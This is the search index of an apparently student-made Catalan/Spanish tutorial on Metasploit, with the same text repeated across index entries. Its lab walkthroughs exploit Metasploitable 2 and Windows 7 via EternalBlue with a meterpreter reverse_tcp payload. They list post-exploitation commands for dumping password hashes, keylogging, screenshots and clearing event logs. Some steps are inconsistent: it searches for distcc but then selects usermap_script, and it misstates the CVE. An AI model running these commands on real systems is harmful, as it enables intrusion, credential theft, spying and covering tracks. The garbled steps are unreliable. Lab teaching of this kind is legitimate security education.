{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"MeTaSPLoiT Perill! No proveu a\u00e7\u00f2 fora d'\u00fan entorn did\u00e1ctic. Podria ser un delicte. M\u00d3DULOS Auxiliary: Permite la interacci\u00f3n de herramientas externas como pueden ser:** Escaners de vulnerabilidades, Sniffers, etc... con el framework de Metasploit Encoders: Proporciona algoritmos par codificar y ofuscar los payloads que utilizaremos tras haber tenido \u00e9xito el exploit Exploits: Aqu\u00ed se encuentran todos los exploits disponibles en el \u201cframework\u201d para conseguir acceso a los diferentes SO\u2019s Payloads: Nos proporciona gran cantidad de c\u00f3digos \u201cmaliciosos\u201d que podremos ejecutar una vez haya tenido \u00e9xito el \u201cexploit\u201d Post: Nos proporciona funcionalidades para la fase de \u201cpost\u201d explotaci\u00f3n como recolecci\u00f3n de informaci\u00f3n, etc... Nops: Nos permite realizar u obtener operaciones NOP para evadir antivirus, IDS, etc... Estructura de directorios (Importante) Modules/exploits/<OS/Platform>/<Protocol/Service/Local...>/file.rb INTRO A METASPLOIT FRAMEWORK Lanzamos la orden msfconsole desde el terminal que nos devolver\u00e1 el identificador msf > para introducir las \u00f3rdenes. Previamente ser\u00e1 bueno actualizarlo: root@kali.~# msfupdate La consola MSF es como un mini-sistema de archivos donde las carpetas que cuelgan de \u00e9l se encuentran f\u00edsicamente en la ruta d\u00f3nde se ha instalado el framework. Ejemplos: Los exploits de Windows esta en la ruta exploit/windows/<..> Los m\u00f3dulos auxiliares en auxiliary/<...> Los encoders en encoders/ COMANDOS B\u00c1SICOS \u00d3rdenes de ayuda * msf > `help \u2013` lista las \u00f3rdenes separadas en dos listados: * \u00d3rdenes del n\u00facleo de msf * \u00d3rdenes de interacci\u00f3n con bases de datos. * -h permite obtener informaci\u00f3n de \u00f3rdenes concretas. Orden de b\u00fasqueda msf > help \u2013 lista las \u00f3rdenes separadas en dos listados: * \u00d3rdenes del n\u00facleo de msf * \u00d3rdenes de interacci\u00f3n con bases de datos. * -h permite obtener informaci\u00f3n de \u00f3rdenes concretas. Orden de b\u00fasqueda \u00datil para la b\u00fasqueda de m\u00f3dulos por alguna caracter\u00edstica o determinar si elframework esta actualizado. * msf > search -h info \u2013 aporta informaci\u00f3n sobre el m\u00f3dulo seleccionado bien con la orden use (que permite seleccionar un m\u00f3dulo), bien especificando la ruta: msf > use exploit/multi/handler msf > info msf > info <ruta> show \u2013 muestra las diferentes opciones para los m\u00f3dulos del framework, exploits,payload, encoders, nops, etc. \u00d3rdenes de interacci\u00f3n y configuraci\u00f3n back \u2013 permite salir del m\u00f3dulo (contrario a use) set y setg \u2013 asignan valores a variables: set para un m\u00f3dulo, setg para en contexto del framework. unset y unsetg \u2013 desasignan valores a par\u00e1metros o variables connect \u2013 permite conectarnos a otra m\u00e1quina para su gesti\u00f3n o administraci\u00f3n dado la direcci\u00f3n IP y el puerto. irb \u2013 permite ejecutar un interprete de Ruby para el framework para ejercutar \u00f3rdenes y scripts. load, unload y loadpath \u2013 load/unload especifica el plugins a cargar/descargar, o directorio donde se almacenan (loadpath). check \u2013 permite verificar si un sistema es vulnerable a cierta vulnerabilidad antes de lanzar el script. exploit \u2013 lanza el c\u00f3digo malicioso, una vez seleccionado y configurado el m\u00f3dulo, sobre la m\u00e1quina, o prepara el entorno para vulnerar la m\u00e1quina. Devuelve el control mediante un shell o un Meterpreter (Meta-interprete: payload que permite cargar e inyectar en un programa del sistema atacado las extensiones que hemos desarrollado en formato .dll). Opciones: * -j ejecutar exploit en segundo plano * -z no se interact\u00faa con la sesi\u00f3n tras explotaci\u00f3n exitosa * -e lanza el paylod con la codificaci\u00f3n establecida sessions \u2013 las shells obtenidas en sistemas vulnerados se organizan por sesiones. Esta orden permite ver las sesiones que tenemos abiertas: -l lista sesiones disponibles -v muestra informaci\u00f3n extra -s script ejecuta script sobre todas las sesiones del Meterpreter -K finaliza todas las sesiones abiertas -c ejecutar \u00f3rdenes sobre sesiones abiertas del meterpreter -u permite actualizar la shell remota tipo Win32 a un meterpreter especificando la sesi\u00f3n. -i especifican sesi\u00f3n con la que interaccionar. resource \u2013 permite la carga de un archivo (.rc) con acciones especificas sobre el framework para automatizar tareas. makerc \u2013 almacena en un archivo el historial de \u00f3rdenes y acciones que se han realiza en la sesi\u00f3n en curso (nombre-usuario en el directorio .msfX) save \u2013 aporta persistencia a la configuraci\u00f3n del entorno, especialmente es test complicados y largos (archivo config en .msfX). jobs \u2013 muestra/finaliza los m\u00f3dulos en ejecuci\u00f3n en segundo plano run \u2013 permite ejecutar un m\u00f3dulo auxiliar cargado en el contexto de la consola. route \u2013 enruta sockets a sesiones (similar al route de Linux). \u00datil en pivoting","title":"Home"},{"location":"#metasploit","text":"Perill! No proveu a\u00e7\u00f2 fora d'\u00fan entorn did\u00e1ctic. Podria ser un delicte.","title":"MeTaSPLoiT"},{"location":"#modulos","text":"Auxiliary: Permite la interacci\u00f3n de herramientas externas como pueden ser:** Escaners de vulnerabilidades, Sniffers, etc... con el framework de Metasploit Encoders: Proporciona algoritmos par codificar y ofuscar los payloads que utilizaremos tras haber tenido \u00e9xito el exploit Exploits: Aqu\u00ed se encuentran todos los exploits disponibles en el \u201cframework\u201d para conseguir acceso a los diferentes SO\u2019s Payloads: Nos proporciona gran cantidad de c\u00f3digos \u201cmaliciosos\u201d que podremos ejecutar una vez haya tenido \u00e9xito el \u201cexploit\u201d Post: Nos proporciona funcionalidades para la fase de \u201cpost\u201d explotaci\u00f3n como recolecci\u00f3n de informaci\u00f3n, etc... Nops: Nos permite realizar u obtener operaciones NOP para evadir antivirus, IDS, etc...","title":"M\u00d3DULOS"},{"location":"#estructura-de-directorios-importante","text":"Modules/exploits/<OS/Platform>/<Protocol/Service/Local...>/file.rb","title":"Estructura de directorios (Importante)"},{"location":"#intro-a-metasploit-framework","text":"Lanzamos la orden msfconsole desde el terminal que nos devolver\u00e1 el identificador msf > para introducir las \u00f3rdenes. Previamente ser\u00e1 bueno actualizarlo: root@kali.~# msfupdate La consola MSF es como un mini-sistema de archivos donde las carpetas que cuelgan de \u00e9l se encuentran f\u00edsicamente en la ruta d\u00f3nde se ha instalado el framework. Ejemplos: Los exploits de Windows esta en la ruta exploit/windows/<..> Los m\u00f3dulos auxiliares en auxiliary/<...> Los encoders en encoders/","title":"INTRO A METASPLOIT FRAMEWORK"},{"location":"#comandos-basicos","text":"","title":"COMANDOS B\u00c1SICOS"},{"location":"#ordenes-de-ayuda","text":"* msf > `help \u2013` lista las \u00f3rdenes separadas en dos listados: * \u00d3rdenes del n\u00facleo de msf * \u00d3rdenes de interacci\u00f3n con bases de datos. * -h permite obtener informaci\u00f3n de \u00f3rdenes concretas.","title":"\u00d3rdenes de ayuda"},{"location":"#orden-de-busqueda","text":"msf > help \u2013 lista las \u00f3rdenes separadas en dos listados: * \u00d3rdenes del n\u00facleo de msf * \u00d3rdenes de interacci\u00f3n con bases de datos. * -h permite obtener informaci\u00f3n de \u00f3rdenes concretas.","title":"Orden de b\u00fasqueda"},{"location":"#orden-de-busqueda_1","text":"\u00datil para la b\u00fasqueda de m\u00f3dulos por alguna caracter\u00edstica o determinar si elframework esta actualizado. * msf > search -h info \u2013 aporta informaci\u00f3n sobre el m\u00f3dulo seleccionado bien con la orden use (que permite seleccionar un m\u00f3dulo), bien especificando la ruta: msf > use exploit/multi/handler msf > info msf > info <ruta> show \u2013 muestra las diferentes opciones para los m\u00f3dulos del framework, exploits,payload, encoders, nops, etc.","title":"Orden de b\u00fasqueda"},{"location":"#ordenes-de-interaccion-y-configuracion","text":"back \u2013 permite salir del m\u00f3dulo (contrario a use) set y setg \u2013 asignan valores a variables: set para un m\u00f3dulo, setg para en contexto del framework. unset y unsetg \u2013 desasignan valores a par\u00e1metros o variables connect \u2013 permite conectarnos a otra m\u00e1quina para su gesti\u00f3n o administraci\u00f3n dado la direcci\u00f3n IP y el puerto. irb \u2013 permite ejecutar un interprete de Ruby para el framework para ejercutar \u00f3rdenes y scripts. load, unload y loadpath \u2013 load/unload especifica el plugins a cargar/descargar, o directorio donde se almacenan (loadpath). check \u2013 permite verificar si un sistema es vulnerable a cierta vulnerabilidad antes de lanzar el script. exploit \u2013 lanza el c\u00f3digo malicioso, una vez seleccionado y configurado el m\u00f3dulo, sobre la m\u00e1quina, o prepara el entorno para vulnerar la m\u00e1quina. Devuelve el control mediante un shell o un Meterpreter (Meta-interprete: payload que permite cargar e inyectar en un programa del sistema atacado las extensiones que hemos desarrollado en formato .dll). Opciones: * -j ejecutar exploit en segundo plano * -z no se interact\u00faa con la sesi\u00f3n tras explotaci\u00f3n exitosa * -e lanza el paylod con la codificaci\u00f3n establecida sessions \u2013 las shells obtenidas en sistemas vulnerados se organizan por sesiones. Esta orden permite ver las sesiones que tenemos abiertas: -l lista sesiones disponibles -v muestra informaci\u00f3n extra -s script ejecuta script sobre todas las sesiones del Meterpreter -K finaliza todas las sesiones abiertas -c ejecutar \u00f3rdenes sobre sesiones abiertas del meterpreter -u permite actualizar la shell remota tipo Win32 a un meterpreter especificando la sesi\u00f3n. -i especifican sesi\u00f3n con la que interaccionar. resource \u2013 permite la carga de un archivo (.rc) con acciones especificas sobre el framework para automatizar tareas. makerc \u2013 almacena en un archivo el historial de \u00f3rdenes y acciones que se han realiza en la sesi\u00f3n en curso (nombre-usuario en el directorio .msfX) save \u2013 aporta persistencia a la configuraci\u00f3n del entorno, especialmente es test complicados y largos (archivo config en .msfX). jobs \u2013 muestra/finaliza los m\u00f3dulos en ejecuci\u00f3n en segundo plano run \u2013 permite ejecutar un m\u00f3dulo auxiliar cargado en el contexto de la consola. route \u2013 enruta sockets a sesiones (similar al route de Linux). \u00datil en pivoting","title":"\u00d3rdenes de interacci\u00f3n y configuraci\u00f3n"},{"location":"about/","text":"Pr\u00e0ctica realitzada per: Pepe Devesa Anotaci\u00f3 Esta part si que la podeu provar a casa. Compte! Aneu amb compte al realitzar esta part. Perill!! No proveu a\u00e7\u00f2 a casa.","title":"About"},{"location":"about/#practica-realitzada-per","text":"","title":"Pr\u00e0ctica realitzada per:"},{"location":"about/#pepe-devesa","text":"Anotaci\u00f3 Esta part si que la podeu provar a casa. Compte! Aneu amb compte al realitzar esta part. Perill!! No proveu a\u00e7\u00f2 a casa.","title":"Pepe Devesa"},{"location":"tema1/exemple1/","text":"En aesta pr\u00e0ctica prepararem la m\u00e0quina metasploitable 2 (linux) per a poder realitzar algunes activitats amb Metasploit amb posterioritat. Perill!! No proveu a\u00e7\u00f2 fora d'un entorn did\u00e1ctic. Podrieu cometrer un delicte... 1 Inicia les m\u00e0quines Kali Linux i Metasploitable 2 . Ha d'haver-hi comunicaci\u00f3 per xarxa local entre ambdues. Anotaci\u00f3 Tots els passos a realitzar es faran des de la m\u00e0quina Kali. S'intentar\u00e0 accedir a la m\u00e0quina Metasploitable mitjan\u00e7ant una vulnerabilitat del dimoni distcc. distcc \u00e9s un compilador del llenguatge C i C++ pensat en l'aprofitament de m\u00e0quines distribu\u00efdes en la mateixa xarxa local per a optimitzar els temps de compilaci\u00f3 utilitzant el temps de CPU d'altres m\u00e0quines que estan ocioses. Kali: B\u00fasqueda del m\u00f3dulo a utilizar con metasploit: search distcc Selecciona el texto \"exploit/unix/misc/distcc_exec\" Kali: Selecciona'l: use exploit/multi/samba/usermap_script Kali: Selecciona el payload a utilitzar: show payloads set payload cmd/unix/bind_ruby Instructions: show options set RHOSTS 10.0.2.5 (Modifica 10.0.2.5 per la IP de la m\u00e0quina a atacar) Kali: Executeu l'exploit: exploit A partir d'ara hem obtingut una terminal en la m\u00e0quina atacada.","title":"Exemple Linux"},{"location":"tema1/exemple1/#en-aesta-practica-prepararem-la-maquina-metasploitable-2-linux-per-a-poder-realitzar-algunes-activitats-amb-metasploit-amb-posterioritat","text":"Perill!! No proveu a\u00e7\u00f2 fora d'un entorn did\u00e1ctic. Podrieu cometrer un delicte... 1 Inicia les m\u00e0quines Kali Linux i Metasploitable 2 . Ha d'haver-hi comunicaci\u00f3 per xarxa local entre ambdues. Anotaci\u00f3 Tots els passos a realitzar es faran des de la m\u00e0quina Kali. S'intentar\u00e0 accedir a la m\u00e0quina Metasploitable mitjan\u00e7ant una vulnerabilitat del dimoni distcc. distcc \u00e9s un compilador del llenguatge C i C++ pensat en l'aprofitament de m\u00e0quines distribu\u00efdes en la mateixa xarxa local per a optimitzar els temps de compilaci\u00f3 utilitzant el temps de CPU d'altres m\u00e0quines que estan ocioses. Kali: B\u00fasqueda del m\u00f3dulo a utilizar con metasploit: search distcc Selecciona el texto \"exploit/unix/misc/distcc_exec\" Kali: Selecciona'l: use exploit/multi/samba/usermap_script Kali: Selecciona el payload a utilitzar: show payloads set payload cmd/unix/bind_ruby Instructions: show options set RHOSTS 10.0.2.5 (Modifica 10.0.2.5 per la IP de la m\u00e0quina a atacar) Kali: Executeu l'exploit: exploit A partir d'ara hem obtingut una terminal en la m\u00e0quina atacada.","title":"En aesta pr\u00e0ctica prepararem la m\u00e0quina metasploitable 2 (linux) per a poder realitzar algunes activitats amb Metasploit amb posterioritat."},{"location":"tema1/exemple2/","text":"En aesta pr\u00e0ctica prepararem la m\u00e0quina Windows 7 per a poder realitzar algunes activitats amb Metasploit. Perill!! No proveu a\u00e7\u00f2 fora d'un entorn did\u00e1ctic. Podrieu cometrer un delicte... Explotar vulnerabilitat CVE-2017-010 amb Eternalblue i Doublepulsar des de Metasploit Simplement utilitzem el seg\u00fcent exploit: use exploit/windows/smb/ms17_010_eternalblue ...i ens torna el control mitjan\u00e7ant un shell o un Meterpreter (Metainterprete:payload que permet carregar i injectar en un programa del sistema atacat les extensions que em desenvolupat en format .dll). i payload set PAYLOAD windows/x64/meterpreter/reverse_tcp i executem exploit Ja estem dins... Comandaments que podem fer servir: De sitema: sysinfo getuid migrate pid hashdump upload/download shell sysinfo De Espionatge keyscan_start/keyscan_dump screenshot/screenstreamer Per a no deixar Rastre clearev Per supossat hi han prou m\u00e9s... convide a l'usuari a investigar-los, nom\u00e9s heu de ficar dins de l'exploit: help","title":"Exemple Windows"},{"location":"tema1/exemple2/#en-aesta-practica-prepararem-la-maquina-windows-7-per-a-poder-realitzar-algunes-activitats-amb-metasploit","text":"Perill!! No proveu a\u00e7\u00f2 fora d'un entorn did\u00e1ctic. Podrieu cometrer un delicte...","title":"En aesta pr\u00e0ctica prepararem la m\u00e0quina Windows 7 per a poder realitzar algunes activitats amb Metasploit."},{"location":"tema1/exemple2/#explotar-vulnerabilitat-cve-2017-010-amb-eternalblue-i-doublepulsar-des-de-metasploit","text":"Simplement utilitzem el seg\u00fcent exploit: use exploit/windows/smb/ms17_010_eternalblue ...i ens torna el control mitjan\u00e7ant un shell o un Meterpreter (Metainterprete:payload que permet carregar i injectar en un programa del sistema atacat les extensions que em desenvolupat en format .dll). i payload set PAYLOAD windows/x64/meterpreter/reverse_tcp i executem exploit Ja estem dins... Comandaments que podem fer servir: De sitema: sysinfo getuid migrate pid hashdump upload/download shell sysinfo De Espionatge keyscan_start/keyscan_dump screenshot/screenstreamer Per a no deixar Rastre clearev Per supossat hi han prou m\u00e9s... convide a l'usuari a investigar-los, nom\u00e9s heu de ficar dins de l'exploit: help","title":"Explotar vulnerabilitat CVE-2017-010 amb Eternalblue i Doublepulsar des de Metasploit"}]}